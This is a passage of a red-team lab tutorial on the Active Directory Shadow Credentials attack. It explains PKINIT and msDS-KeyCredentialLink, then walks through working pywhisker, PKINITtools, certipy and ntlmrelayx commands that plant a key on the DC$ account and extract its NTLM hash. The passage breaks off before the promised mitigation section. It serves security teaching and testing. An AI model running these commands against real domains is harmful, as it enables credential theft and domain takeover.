<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">Shadow Credentials Attack</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/shadow-credentials-attack/" rel="bookmark"><time class="entry-date published" datetime="2025-02-12T17:07:08+00:00">February 12, 2025</time><time class="updated" datetime="2025-06-19T13:23:02+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000">To begin with, this post explores the exploitation technique known as the Shadow Credentials attack. This attack leverages the mismanagement or exploitation of Active Directory Certificate Services (AD CS) to inject custom certificates into a user account, granting attackers persistent access. As a result of modifying the msDS-KeyCredentialLink attribute, adversaries can effectively create “shadow credentials” that allow them to authenticate as the target user without needing their password or NTLM hash.</span></p>
<p><span style="color: #000000">The post outlines lab setup, exploitation methods, and mitigation techniques, mapped to the MITRE ATT&amp;CK framework for clarity. In addition, detection mechanisms and actionable recommendations are provided to help security professionals identify and defend against this prevalent threat.</span></p>
<p><span style="color: #000000">Specifically, this article focuses on the Shadow Credentials attack, a stealthy method that enables persistence in Active Directory by exploiting misconfigurations in certificate-based authentication.</span></p>
<h3><span style="color: #800000">Table of Contents</span></h3>
<ul>
<li><span style="color: #000000">Shadow Credentials</span></li>
<li><span style="color: #000000">Prerequisites</span></li>
<li><span style="color: #000000">Lab Setup</span></li>
</ul>
<p><strong><span style="color: #000000">Exploitation</span></strong></p>
<ul>
<li><span style="color: #000000">Bloodhound – Hunting for Weak Permission</span></li>
</ul>
<p><strong><span style="color: #000000">Method for Exploitation – AS-REP Roasting Attack (T1558.004)</span></strong></p>
<ul>
<li><span style="color: #000000">PyWhisker</span></li>
<li><span style="color: #000000">PKINITtools</span></li>
<li><span style="color: #000000">Certipy-ad</span></li>
<li><span style="color: #000000">NTLMRelayx</span></li>
<li><span style="color: #000000">BloodyAD</span></li>
<li><span style="color: #000000">Metasploit</span></li>
<li><span style="color: #000000">ldap_shell tool</span></li>
</ul>
<p><strong><span style="color: #000000">Post Explotation</span></strong></p>
<ul>
<li><span style="color: #000000">Impacket -psexec</span></li>
<li><span style="color: #000000">Evil-winrm</span></li>
</ul>
<p><strong><span style="color: #000000">Detection &amp; Mitigation</span></strong></p>
<h3><span style="color: #800000">Introduction to Kerberos Authentication</span></h3>
<p><span style="color: #000000">Active Directory uses Kerberos, a trusted authentication protocol, to securely verify the identity of users and services. It issues tickets to avoid transmitting passwords over the network.</span></p>
<h4><span style="color: #000000">Symmetric Encryption in Kerberos</span></h4>
<p><span style="color: #000000">In traditional Kerberos authentication, symmetric encryption is used. Here’s how it works:</span></p>
<ol>
<li><span style="color: #000000"><strong>AS-REQ (Authentication Service Request):</strong> The client sends a request to the Key Distribution Center (KDC), including a timestamp encrypted with a key derived from the user’s password.</span></li>
<li><span style="color: #000000"><strong>AS-REP (Authentication Service Response):</strong> The KDC validates the timestamp using the user’s stored hash and returns a Ticket Granting Ticket (TGT) encrypted with the KDC’s secret key.</span></li>
<li><span style="color: #000000"><strong>TGS-REQ and TGS-REP:</strong> The client uses the TGT to request access to a service, and the KDC issues a service ticket.</span></li>
</ol>
<p><span style="color: #000000">However, while symmetric encryption is effective, it relies on shared secrets (passwords) and is not suitable for scenarios requiring public key infrastructure (PKI), such as smart card authentication.</span></p>
<h4><span style="color: #000000">Asymmetric Encryption with PKINIT</span></h4>
<p><span style="color: #000000"><strong>PKINIT (Public Key Cryptography for Initial Authentication)</strong>: To address this limitation, PKINIT (Public Key Cryptography for Initial Authentication) is an extension of Kerberos that uses asymmetric encryption. Instead of relying on passwords, it uses public-private key pairs for authentication.</span></p>
<p><span style="color: #000000"><strong>PKINIT Certificate Authentication</strong>: Uses a traditional X.509 certificate and private key pair to authenticate a Kerberos client. The KDC directly validates the certificate.</span></p>
<p><span style="color: #000000"><strong>PKINIT Key Trust</strong>: Relies on a public key stored in the <strong>msDS-KeyCredentialLink</strong> attribute of an AD object. The KDC authenticates the client by verifying that the public key used in the authentication request matches the one stored in the AD object, without needing a traditional certificate.</span></p>
<p><span style="color: #000000">Here’s how it works:</span></p>
<ol>
<li><span style="color: #000000"><strong>AS-REQ with PKINIT:</strong> The client sends a request to the KDC, including a timestamp signed with the client’s private key and the corresponding public key.</span></li>
<li><span style="color: #000000"><strong>Public Key Validation:</strong> The KDC checks the client’s public key against the <strong>msDS-KeyCredentialLink</strong> attribute in Active Directory. Means, instead of directly using the certificate for authentication, the KDC is validating if any of the public keys in the <strong>msDS-KeyCredentialLink</strong> attribute of the user matches the one used in the AS-REQ. If the key is valid, the KDC decrypts the timestamp and verifies the signature.</span></li>
<li><span style="color: #000000"><strong>AS-REP:</strong> If validation is successful, the KDC issues a TGT to the client.</span></li>
</ol>
<p><span style="color: #000000">Consequently<em data-start="1951" data-end="1965">, </em>Among various lateral movement and persistence techniques, the <strong data-start="753" data-end="782">Shadow Credentials attack</strong> has become a significant concern for AD security analysts due to its covert nature and minimal visibility on traditional SIEM tools.</span></p>
<h4><span style="color: #000000">The msDS-KeyCredentialLink Attribute</span></h4>
<p><span style="color: #000000">In simple terms, PKINIT introduces the <strong>msDS-KeyCredentialLink</strong> attribute in Windows Server 2016 to store public keys for authentication. This attribute is crucial for certificate-based authentication, and here are its key details:</span></p>
<ol>
<li><span style="color: #000000">The <strong>msDS-KeyCredentialLink</strong> is a multi-value attribute, meaning multiple public keys can be stored for a single account, often representing different devices linked to that account.</span></li>
<li><span style="color: #000000">Each value in this attribute contains serialized objects called Key Credentials. These objects include:</span></li>
</ol>
<ul>
<li style="list-style-type: none">
<ul>
<li><span style="color: #000000">Creation date</span></li>
<li><span style="color: #000000">Distinguished name of the owner</span></li>
<li><span style="color: #000000">A GUID representing a Device ID</span></li>
<li><span style="color: #000000">The public key itself</span></li>
</ul>
</li>
</ul>
<ol start="3">
<li><span style="color: #000000">During PKINIT authentication, the client’s public key is verified against the values stored in this attribute. If a match is found, the KDC proceeds with authentication.</span></li>
<li><span style="color: #000000"><em data-start="2255" data-end="2266">Therefore</em>, managing and modifying the <strong>msDS-KeyCredentialLink</strong> attribute is an action that requires specific permissions, typically held by accounts that are members of highly privileged groups.</span></li>
</ol>
<h5><span style="color: #000000"><strong>These groups include:</strong></span></h5>
<p><span style="color: #000000"><strong>Key Admins:</strong> </span></p>
<p><span style="color: #000000">Members of this group can perform administrative actions on key objects within the domain. The Key Admins group applies to the Windows Server operating system in Default Active Directory security groups.</span></p>
<p><span style="color: #000000"><strong>Enterprise Key Admins:</strong> </span></p>
<p><span style="color: #000000">Members of this group can perform administrative actions on key objects within the forest.</span></p>
<p><span style="color: #000000"><strong>D<span style="color: #000000">omain Admins:</span></strong> </span></p>
<p><span style="color: #000000">Members of this group have almost all the privileges within a domain, including the ability to modify attributes.</span></p>
<ol start="5">
<li><span style="color: #000000">It is important to note that user objects can’t edit their own <strong>msDS-KeyCredentialLink</strong> attribute, while computer objects can.  On the other hand, computer objects can edit their own <strong>msDS-KeyCredentialLink</strong> attribute but can only add a KeyCredential if none already exists.</span></li>
</ol>
<h4><span style="color: #000000">How Shadow Credentials Work</span></h4>
<p><span style="color: #000000">The Shadow Credentials attack takes advantage of improper permissions on the <strong>msDS-KeyCredentialLink</strong> attribute, allowing attackers to inject their own public key into the attribute of a target user or computer account. Once this is done, they can impersonate the target account using PKINIT.</span></p>
<p><span style="color: #000000">To clarify the process, here is how the attack works step by step:</span></p>
<p><span style="color: #000000"><strong>Step 1: Identify Target Permissions</strong></span></p>
<p><span style="color: #000000">The attacker identifies an Active Directory object (such as a user or computer account) where they have permissions to modify attributes. Permissions like <strong>GenericWrite</strong> or <strong>GenericAll</strong> are required to modify the <strong>msDS-KeyCredentialLink</strong> attribute.</span></p>
<p><span style="color: #000000"><strong>Step 2: Inject the Attacker’s Public Key</strong></span></p>
<p><span style="color: #000000">Next, the attacker adds their own public key to the <strong>msDS-KeyCredentialLink</strong> attribute of the target account. This process essentially “registers” the attacker’s key as a valid authentication method for the target.</span></p>
<p><span style="color: #000000"><strong>Step 3: Generate a Certificate</strong></span></p>
<p><span style="color: #000000">The attacker creates a certificate in PFX format using the private key associated with the injected public key. This certificate is now tied to the target account.</span></p>
<p><span style="color: #000000"><strong>Step 4: Authenticate as the Target Account</strong></span></p>
<p><span style="color: #000000">With the generated certificate, the attacker authenticates to the domain using PKINIT. The KDC validates the attacker’s public key against the <strong>msDS-KeyCredentialLink</strong> attribute and issues a Ticket Granting Ticket (TGT) for the target account.</span></p>
<p><span style="color: #000000"><strong>Step 5: Impersonate Users or Escalate Privileges</strong></span></p>
<p><span style="color: #000000">Using the TGT, the attacker can:</span></p>
<ul>
<li><span style="color: #000000">Perform lateral movement within the network.</span></li>
<li><span style="color: #000000">Use the <strong>S4U2self</strong> protocol to impersonate other users.</span></li>
<li><span style="color: #000000">Extract NTLM hashes from the Privilege Attribute Certificate (PAC).</span></li>
</ul>
<h3><span style="color: #800000">Prerequisites</span></h3>
<ul>
<li><span style="color: #000000">Windows Server 2019 as Active Directory that supports PKINIT</span></li>
<li><span style="color: #000000">Domain must have Active Directory Certificate Services and Certificate Authority configured.</span></li>
<li><span style="color: #000000">Kali Linux</span></li>
<li><span style="color: #000000">Tools: PyWhishker, Impacket, certipy-ad, BloodyAD, Metasploit, ldap_shell</span></li>
<li><span style="color: #000000">Windows 10/11 – As Client</span></li>
</ul>
<h3><span style="color: #800000">Lab Setup</span></h3>
<p><span style="color: #000000">In this lab setup, we will create a user named ‘Krishna’ and elevate its privileges by adding it to the Key Admins and Enterprise Key Admins groups. This setup will showcase how attackers can exploit the </span><strong>msDS-KeyCredentialLink</strong><span style="color: #000000"> attribute to perform a Shadow Credentials attack, demonstrating privilege escalation and unauthorized persistent access.</span></p>
<h4><span style="color: #000000">Create the AD Environment:</span></h4>
<p><span style="color: #000000">To simulate an Active Directory environment, you will need a Windows Server as a Domain Controller (DC) and a client machine (Windows or Linux) where you can run enumeration and exploitation tools.</span></p>
<h4><span style="color: #000000">Domain Controller:</span></h4>
<ul>
<li><span style="color: #000000">Install Windows Server (2016 or 2019 recommended) that supports PKINIT.</span></li>
<li><span style="color: #000000">Promote it to a Domain Controller by adding the <strong>Active Directory Domain Services</strong></span></li>
<li><span style="color: #000000">Set up the domain (e.g., <strong>local</strong>).</span></li>
<li><span style="color: #000000">The domain must have <strong>Active Directory Certificate Services</strong> and a <strong>Certificate Authority</strong></span></li>
</ul>
<h4><span style="color: #000000">User Accounts:</span></h4>
<ul>
<li><span style="color: #000000">Firstly, create an AD user account named <strong>Krishna</strong>.</span></li>
</ul>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">net user krishna Password@1 /add /domain</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhNaT6QQobkty42Da96w384Vj-kiYSJ8JXZpEyLnrIiaYn5ZPjUjLtbzu2Wm0V2a9FiOq0gWfK5LuD01SuDFvSVsluiJXUpMMRohhaMyZstGMeLE81KKzP-M1Bh7GIfQZ0E6R-YOD1uukkpMHVV-kparTVa2sfa-SlK21RbETcnPhK2-XtAsz_QGVgQyLdK/s16000/1.png"/></span></p>
<p><span style="color: #000000"><strong>Add ‘Krishna’ User to Privileged Groups:</strong></span></p>
<p><span style="color: #000000">Once your AD environment is set up, you need to add <strong>Krishna</strong> user to the <strong>Key Admins</strong> and <strong>Enterprise Key Admins</strong> security groups.</span></p>
<p><span style="color: #000000"><strong>Steps</strong>:</span></p>
<ul>
<li><span style="color: #000000">Open <strong>Active Directory Users and Computers</strong> (ADUC) on the Domain Controller.</span></li>
<li><span style="color: #000000">Enable the <strong>Advanced Features</strong> view by clicking on <strong>View</strong> &gt; <strong>Advanced Features</strong>.</span></li>
<li><span style="color: #000000">Locate User <strong>Krishna</strong> in the <strong>Users</strong></span></li>
<li><span style="color: #000000">Right-click on <strong>Krishna User</strong> and go to <strong>Properties</strong>.</span></li>
</ul>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgASUPkOOIq1YpsxL0TFCQHssxA2bU5nx1wg95zQwcHv5cMzF5rLfXtrFog3POdSOSVm5fZ1a1TV3djCIWD9yFsNxETCre5mruRF8s0xYHFOy-ussJeXPmomJMe9OdVZXXmbvVRC_CpP7Id7r43UZvBBW1aOWQPeEEw9ksCz-fDWlE7qPFiovH6Nx9c8LMX/s16000/2.png"/></span></p>
<ul>
<li><span style="color: #000000">Go to the <strong>Member Of</strong>tab and click on <strong>Add</strong> button</span></li>
<li><span style="color: #000000">In the “Enter the object name to select” box, type <strong>Key Admins</strong> and <strong>Enterprise Key Admins</strong>and click <strong>Check Names </strong>and click on OK</span></li>
<li><span style="color: #000000">Apply the settings.</span></li>
</ul>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0eLGT6240Irmz0ZOGhA5_W5Ps6NB_KQFksdlH2En05usjx-85vmJJ2Isma9y3zB1I4okE4vuGkwJDbwmbYBtwoTMA-VT_Vo33cXuQq3vxlxXVWn0i7N8yas3eEZJOQhWABY8Tw4Q0BHwYtHN0qX29IiL7xh2yeE72aPJWWsMTquGXSmikdUjoHBEzLp1x/s16000/3.png"/></span></p>
<p><span style="color: #000000">Setting up a controlled environment is crucial to accurately simulate and analyze the <strong data-start="1072" data-end="1101">Shadow Credentials attack</strong> in a real-world AD environment.</span></p>
<h3><span style="color: #800000">Exploitation</span></h3>
<h3><span style="color: #000000">Bloodhound – Hunting for Weak Permission</span></h3>
<p><span style="color: #000000"><strong>To verify the setup, use BloodHound to Confirm Privileges</strong>: You can use <strong>BloodHound</strong> to verify that <strong>Krishna</strong> have the ability to write to the “msds-KeyCredentialLink” property on DC.IGNITE.LOCAL</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodhound-python -u krishna -p Password@1 -ns 192.168.1.48 -d ignite.local -c All</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhZAEDr2xHE_sccCQEyE6li_f6U_tCoLHJdCctPwLHok6RnueK-SCEYw0GTM-DjkGChs3J9RJk9EPBpGfx-CtG7olSnRs9YNTFx7XvXbhoKLFewoUAEZH_ge5fJceXW9MYL9SqAOrXrYQKip9-dZRYKucnSq9el0O1oDebnJHoLlpDumBzixTxCoDUFLIpz/s16000/4.png"/></span></p>
<p><span style="color: #000000">From the graphical representation of Bloodhound, the tester would like to identify the Reachable high value targets for selected user.</span></p>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhe2Pn3eUAQJsggpl0LNvFlFfhdXI2ye3SQ2TJEgPNxK3QQFaUGNvPOk13PDOXareyCYudHXx9rhddOBp4nZMjzPc7Nx6iX6LwL5t32qNSxfVzUTX4_kVY0d8wWN3PSAcNY5ZGfaUjLp1jZPVb04hlTRdYSChF5_n3UIogzTfESQSB_Gw1tXXNARgc9RYyN/s16000/5.png"/></span></p>
<p><span style="color: #000000">Thus, it has shown the Krishna User have the ability to write to the “<strong>msds-KeyCredentialLink</strong>” property on <strong>DC.IGNITE.LOCAL</strong>. Writing to this property allows an attacker to create “Shadow Credentials” on the object and authenticate as the principal using Kerberos PKINIT.</span></p>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjkfA04MgupraKdcVOE5r8X5X2mwIqrm1ab_viZhMiwLK6XFHM2s2AYhIFlnUJp5QtcdhVZ8ZyhNIoSGyzxcygnzKFi-nRLJ_pOB0sK4AgYD8QRMkX7atYx95YCZd0yjsymqHjvyIu9g5HK96xSERL0F0vLQVdZ0mLMFkChyJEw456OA-W0vmUUn6bPFQ7n/s16000/6.png"/></span></p>
<h3><span style="color: #800000">Method for Exploitation</span></h3>
<p><span style="color: #000000">Attackers can exploit the <strong>msDS-KeyCredentialLink</strong> attribute by injecting rogue public keys into a target user’s account. One of the main enablers of the <strong data-start="1240" data-end="1269">Shadow Credentials attack</strong> is the misuse of the <strong>msDS-KeyCredentialLink</strong> attribute, which allows attackers to register rogue public keys for authentication.<br/>
</span></p>
<h4><span style="color: #000000">PyWhisker</span></h4>
<p><span style="color: #000000">From UNIX-like systems, the </span><strong>msDS-KeyCredentialLink</strong><span style="color: #000000"> attribute of a user or computer target can be manipulated with the <a style="color: #000000" href="https://github.com/ShutdownRepo/pywhisker"><strong>pyWhisker</strong></a> tool.</span></p>
<p><span style="color: #000000">Clone the repository and install:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/ShutdownRepo/pywhisker.git
python3 setup.py install</pre>
<p><span style="color: #000000">List all the current <strong>KeyCredential IDs</strong> and their <strong>creation times</strong> associated with the <strong>DC$</strong> object.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">pywhisker -d ignite.local -u "krishna" -p "Password@1" --target "DC$" --action "list"</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh20nZFtCzrVOmTjr0C6LdoP6sz1rcIjVF1k6k1tk4vTbPn7Ks3O8gk8J60215ytNeSOqsqDcF1oFr9eNZ13Nye8mKhwCo5dD2tjAM8Rt6nCsdDNbTN_pF4Zsq1p2eSin4uSpEtVhD0l5mZQF42hfugz1_e7LlBxcYTxhXR2COfn4q7i_C9l7WmWBhV7YWq/s16000/8.png"/></span></p>
<p><span style="color: #000000">At this point of time, it shows that attribute </span><strong>msDS-KeyCredentialLink</strong><span style="color: #000000"> is empty.</span></p>
<p><span style="color: #000000">The exploitation phase begins with populating the </span><strong>msDS-KeyCredentialLink</strong><span style="color: #000000"> attribute. </span></p>
<p><span style="color: #000000">PyWhishker <strong>add</strong> functionality, will generates a public-private key pair and adds a new key credential to the target object DC$.</span></p>
<p><span style="color: #000000">Following this,  the output specifies the PFX file (and its associated password) where the certificate is stored. You will need this in the next step to obtain a Kerberos TGT (ticket-granting-ticket) for the machine account using PKINIT.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">pywhisker -d "ignite.local" -u "krishna" -p "Password@1" --target "DC$" --action "add" --filename DC$</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiT2x7Y5VAJj361oVIMsDGHg8__643wZYa_Etf8jJswK-kr_7y4QAEdr0MapQvmZzCOyfqQuMAljxG7IXQIPBoFDxKXpLrLfjfc8bPB_gl7ll1fUjZLyNmEUCtx3ciDIPdspYOtzFXmGLR1YpMh6kCLsxyxM1VNsDjDJ-0SVIHMxqdEu8_8rAnvJZWg0p0w/s16000/9.png"/></span></p>
<p><span style="color: #000000">After you add the new key, rerun the list command to verify that the system successfully added it. This time, the output will show the newly created <strong>KeyCredential ID</strong>, along with its <strong>creation time</strong>, including the <strong>Device ID</strong> of the new key.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">pywhisker -d ignite.local -u "krishna" -p "Password@1" --target "DC$" --action "list"</pre>
<p><span style="color: #000000">Next, use the <code data-start="747" data-end="763">pywhisker info</code> command to retrieve detailed information about the newly added KeyCredential linked to the <strong>DC$ object</strong>, identified by the <strong>Device ID</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">pywhisker -d "ignite.local" -u "krishna" -p "Password@1" --target "DC$" --action "info" --device-id e9c84cef-af24-9755-8ce3-67088fd3d280</pre>
<p><span style="color: #000000"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2SzOslWwkjT2bElfc2l3qTVQpH0DmDnAnSA2bhZCf9g7PhxV5ehNnFKSqh7lxKdZ3tUsZu3tcwat4JfBtdhdrRZ0vWR4IFvQD0de4ecS3WE3kPv_36xzqJmbG48icwm8zkDnu7LP9Yr7PvqHKXyIJjw-tgz8f-PqaInTaxAYK-1kaU-B-ZcrXKb1e-AP6/s16000/10.png"/></strong></span></p>
<h4><span style="color: #000000">PKINITtools</span></h4>
<h5><span style="color: #000000">Utilize <span style="color: #0000ff"><a style="color: #0000ff" href="https://github.com/dirkjanm/PKINITtools"><strong>PKINITOOLS</strong></a>  </span>to obtain a Kerberos TGT (ticket-granting-ticket) for the machine account</span></h5>
<p><span style="color: #000000">Request a TGT using the PFX file that we generated using whisker’s add functionality. This uses Kerberos PKINIT and will output a TGT into the specified ccache. It will also print the AS-REP encryption key which you may need for the getnthash.py tool.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python gettgtpkinit.py -cert-pfx "/root/DC$.pfx" -pfx-pass eK2PeOlwG60EkPS2TNxX ignite.local/dc$ dc$.ccache</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhVi96uhvdPkKfPn0N-nqpDoF-fnSenuNNaPqX-zam9cJumtG0UcpBFcpxB3o4G9SOoQK7NLF1Wu4494m37OVuyuCmqPKKQwrnwNH2XQPdMn9rKvhfGgPU3mgjKI2_CxD0doHfcrVk_tc__Ia7Us5kFlVwAePZcJo4t25oD9C_WGWONYGgS701AGZL_R3dS/s16000/11.png"/></span></p>
<p><span style="color: #000000">Set the <strong>KRB5CCNAME</strong> environment variable to point to the previously generated <strong>dc$.ccache</strong> file</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">export KRB5CCNAME=/root/PKINITtools/dc$.ccache</pre>
<p><span style="color: #000000">Utilize <strong>getnthash.py</strong> to retrieve the machine account’s NTLM hash</span></p>
<p><span style="color: #000000">The getnthash.py tool utilizes Kerberos U2U (User-to-User) to submit a TGS (Ticket Granting Service) request for the attacker, which includes the PAC (Privilege Attribute Certificate). The PAC contains the NT hash for the targeted account, and the tool decrypts it using the AS-REP key that was used to obtain the TGT (Ticket Granting Ticket). This allows the attacker to extract the NTLM hash for further exploitation, such as Pass-the-Hash attacks.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python getnthash.py -key 86b989daa8099f4f9f04f14be14b33556f043c56b48b4d3c36ef030a65c9b3a0 ignite.local/dc$</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhC5IGw_0A70sqHG8_Y2x2cYo7KamewlOrIS1DslfnQS9xl8_mTwHDOlQlaYXxMIkRh2YfPkIun22X2iqzvJJM4gd9D2EpXKr2AqAVKLrpxOsexhywlq4Zx7K6b7ABEgXSoYkC2I8NhqaZ0XXtyIMpOqQFVwPgZD6bWqEUUVjAe3Ghc7rj19EGTpR2yDWjU/s16000/12.png"/></span></p>
<h4><span style="color: #000000">Certipy-ad</span></h4>
<p><span style="color: #000000">As an alternative, <span style="color: #0000ff"><a style="color: #0000ff" href="https://github.com/ly4k/Certipy"><strong>Certipy</strong></a> </span>can automate these steps in a single command, streamlining the exploitation process.</span></p>
<p><span style="color: #000000">Certipy’s shadow command has an auto action, which will add a new Key Credential to the target account, authenticate with the Key Credential to retrieve the NT hash and a TGT for the target, and finally restore the old Key Credential attribute.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad shadow auto -u krishna@ignite.local -p Password@1 -account dc$</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEit3TZGvCE9qFoUPERC8UusyDnJRw8VtW2KsJePGhSrk9qeN6jRCj0rskkpXWoOsbxMn1W9HivtGKDz1Gj5qwqXms0y_VBLE49dqBj6i4O8_CKa3x53sHs4xBjfuABsubI94ffHVzVQLF9aezz0jo2wis8zeCUfzFZqUVZJH33gbYquUEwxfXRE6JaaKptC/s16000/20.png"/></span></p>
<h4><span style="color: #000000">NTLMRelayx</span></h4>
<p><span style="color: #000000">Alternatively, you can set shadow credentials on the computer object using <code data-start="979" data-end="991">ntlmrelayx</code>.</span></p>
<p><span style="color: #000000">We will launch ntlmrelayx with the “–shadow-credentials” option and the “–shadow-target” parameter set to the name of the computer account that we are expecting to relay (in this case, DC$)</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-ntlmrelayx -t ldap://192.168.1.58 --shadow-credentials --shadow-target 'dc$'</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiZwldnIkZtAmz2BaCxwIvjrzOMO_BRBh7xgn91TeCzWqyU1syjCbR40qwrE0voFB-vdUwcwoO8HKmYBWtETY8M22xZ3tQ_KLq_iihSh6A9YFJp5HA3NcE8vXLDfofGXBvMxWUdD00vfxDQQvJs1VpLE0W5SnjTlshG1Qp3bSVnwb98gIlab71zcWELZIHT/s16000/21.png"/></span></p>
<p><span style="color: #000000">Trigger a callback via browser, using krishna user’s credentials.</span></p>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgNuNKhpiGPi8apbNh06pIGXeS5RoHKARX2x8G8_HN3vGjlU3s9R5r1nDkIGx08dHqwR0OpfaUqerxl6a9i_taozmiBeGzhxb7-WDXztA11XOm3vEeXxSRjbqdW7xua8J4pwBeRsxcDhKoXHs5lMu-RU2uRnd00M_ZpO7noWlJgxcJPyEneRFlFiREliNun/s16000/22.png"/></span></p>
<p><span style="color: #000000">After a brief wait, we receive an HTTP connection from the DC$ computer account along with its NTLM credentials. These credentials are then relayed to the LDAP service on the domain controller and the </span><strong>msDS-KeyCredentialLink</strong><span style="color: #000000"> attribute of the relayed computer account is updated.</span></p>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi5IkDWNbssvuL8jJKivZNUnuyI1nmk1nxdpsHfgw1FTcoasbOV8y_tPZXQ0BlwADV7GIR1OqiR9QebXzpktDSohy2_URDtp0lCVKxPwE39tPoAsH5GJdieuu1rQEZnjddxXbhkfEJK-r52h_22iIgeDY90hCJrWR_XM3ccqko6G3EOS2KMpqDsQVcgvQJC/s16000/23.png"/></span></p>
<p><span style="color: #000000">Utilize <a style="color: #000000" href="https://github.com/dirkjanm/PKINITtools"><strong><span style="color: #0000ff">PKINITOOLS</span></strong></a>  to obtain a Kerberos TGT (ticket-granting-ticket) for the machine account</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 PKINITtools/gettgtpkinit.py -cert-pfx vX3iEoe3.pfx -pfx-pass 5SwBdP4py1IG9kDhh2nk ignite.local/dc$ shadow.ccache</pre>
<p><span style="color: #000000">Set the <strong>KRB5CCNAME</strong> environment variable to point to the previously generated <strong>shadow.ccache</strong> file</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">export KRB5CCNAME=shadow.ccache</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEidJgHrlrNPCCreR5gWoGDu4xqPF-qeGxI9t3aWFpFTVKQJ5hQsqUdjXJxKkmTq0ZmUQxdz_2DzyHGAUzN9ZkvEFo-Kpg24MjfC_32VzzYwYQ7wW0uBseKGugogcJpKGvSunkSCfxYmVK68DT_2ofXeYO_H_3BMHFi8UVxzjduuNmPvpHfJN6wJT9rpJwtL/s16000/24.png"/></span></p>
<p><span style="color: #000000">Utilize <strong>getnthash.py</strong> to retrieve the machine account’s NTLM hash</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python PKINITtools/getnthash.py -key 44ca95c94d0cb47212d3ee5ff27b9cf8a48a5cd113f0120a3178112e4af16f48 ignite.local/dc$</pre>
<p><span style="color: #000000"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgg2EDz9PDkCinr-Iudcskc6CmrgPy1R75moIgzNH4w_rO_DRtXuzruWKDBKeOOQgH1mQgBHQtFPRE2jVLIo8nREyTdGmfqvyM2pKT2oLwVHn4QQ-jvj5aibrXLIq5F0szb4jKSNFzbX9MBPAc4cRBy-D-15R_JIv18jmfeNpRldNzzjNV2a_YdQgToZmQL/s16000/25.png"/></strong></span></p>
<h4><span style="color: #000000">BloodyAD</span></h4>
